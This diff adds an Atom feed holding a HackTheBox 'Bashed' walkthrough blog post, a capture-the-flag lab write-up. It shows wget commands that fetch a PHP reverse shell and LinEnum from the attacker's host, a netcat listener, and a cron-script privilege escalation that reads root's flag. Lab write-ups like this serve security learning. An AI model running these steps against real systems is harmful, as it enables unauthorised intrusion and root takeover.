@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Random stuff - HackTheBox</title><link href="/" rel="alternate"></link><link href="/feeds/hackthebox.atom.xml" rel="self"></link><id>/</id><updated>2020-01-13T20:00:00+01:00</updated><entry><title>Bashed</title><link href="/bashed.html" rel="alternate"></link><published>2020-01-13T20:00:00+01:00</published><updated>2020-01-13T20:00:00+01:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-01-13:/bashed.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bashed&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;User flag&lt;/h1&gt;
+&lt;p&gt;It is not really necessary to start this one with &lt;em&gt;nmap&lt;/em&gt;, but it's never a bad first step&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~# nmap -sS -Pn -sV &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
+Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.70 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-01-13 &lt;span class="m"&gt;13&lt;/span&gt;:20 CET
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.11s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;999&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+&lt;span class="m"&gt;80&lt;/span&gt;/tcp open  http    Apache httpd &lt;span class="m"&gt;2&lt;/span&gt;.4.18 &lt;span class="o"&gt;((&lt;/span&gt;Ubuntu&lt;span class="o"&gt;))&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in &lt;span class="m"&gt;10&lt;/span&gt;.24 seconds
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a &lt;em&gt;phpbash&lt;/em&gt; project. That's nice, but we want to speed things up.&lt;/p&gt;
+&lt;p&gt;We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuser.
+It takes him a few minutes to find the thing we need:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://10.10.10.68/dev/phpbash.php
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls /user
+$ cat /home/arrexel/user.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yup, we got it!&lt;/p&gt;
+&lt;h1&gt;Root flag&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;phpbash&lt;/em&gt; is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.&lt;/p&gt;
+&lt;p&gt;Firstly we need a place in the /var/www/html path to store it. Only the &lt;em&gt;upload&lt;/em&gt; dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;www-data:/var/www/html/uploads# wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/shell.php
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:/var/www/html# nc -v -n -l -p &lt;span class="m"&gt;1234&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It works, so now the same thing in &lt;em&gt;/tmp&lt;/em&gt; dir &lt;em&gt;LinEnum&lt;/em&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
+wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/LinEnum.sh
+bash LinEnum.sh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can see good stuff in it's output!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[+] We can sudo without supplying a password!
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We knew about this user already from listing the home directory. Now we can sudo it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo -u scriptmanager bash
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Works. What next? We need something to find a point for privilege escalation. &lt;em&gt;pspy&lt;/em&gt; will help us with it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pspy64
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2297&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="nt"&gt;test&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;
+&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2296&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sh&lt;/span&gt; &lt;span class="nt"&gt;-c&lt;/span&gt; &lt;span class="nt"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;scripts&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;f&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;do&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$f&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;done&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Nice, we can see, that &lt;em&gt;/scrips&lt;/em&gt; dir is owned by &lt;em&gt;scriptmanager&lt;/em&gt;!&lt;/p&gt;
+&lt;p&gt;Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/root/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chmod 777 /tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As in every step, I've served it on my Kali apache, so:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/bashed/run.py
+
+sudo -u scriptmanager cp run.py /scripts
+$ cat /tmp/root.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;IT'S ROOTED. It was not difficult but fun!&lt;/p&gt;</content><category term="hackthebox"></category><category term="htb"></category><category term="solution"></category><category term="hacking"></category></entry></feed>
